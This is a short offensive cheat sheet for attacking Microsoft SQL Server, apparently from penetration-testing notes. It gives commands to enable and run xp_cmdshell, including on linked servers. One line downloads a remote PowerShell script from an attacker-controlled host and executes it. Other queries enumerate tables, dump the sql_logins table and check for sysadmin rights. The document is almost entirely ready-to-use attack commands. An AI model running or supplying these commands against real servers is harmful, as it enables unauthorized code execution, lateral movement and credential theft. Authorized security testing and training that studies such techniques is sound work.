### Enable xp_cmdshell SQL Server configuration
```
mssql&gt; enable_xp_cmdshell
```

### Execute shell command
```
mssql&gt; EXEC xp_cmdshell &lt;command&gt;
```

### Download string and invoke expression
```
mssql&gt; EXEC xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString("http://&lt;lhost&gt;/&lt;file&gt;.txt") | powershell -noprofile'
```

### Enable xp_cmdshell on linked servers
```
mssql&gt; EXEC('sp_configure ''show advanced options'',1; reconfigure;') AT [&lt;fdqnRhost&gt;]
mssql&gt; EXEC('sp_configure ''xp_cmdshell'',1; reconfigure;') AT [&lt;fdqnRhost&gt;]
mssql&gt; SELECT * FROM OPENQUERY("&lt;fqdnRhost&gt;", 'select * from sys.configuration where name = ''xp_cmdshell''')
```

### Get hostname
```
SELECT HOST_NAME();
```

### Get tables
```
SELECT name FROM &lt;database&gt;..sysobjects;
SELECT * FROM &lt;databaseName&gt;.INFORMATION_SCHEMA.TABLES;
```

### Get content of table
```
SELECT * FROM master..sql_logins;
```

### Get permissions
```
SELECT is_srvrolemember('sysadmin');
SELECT is_srvrolemember('serveradmin');
```


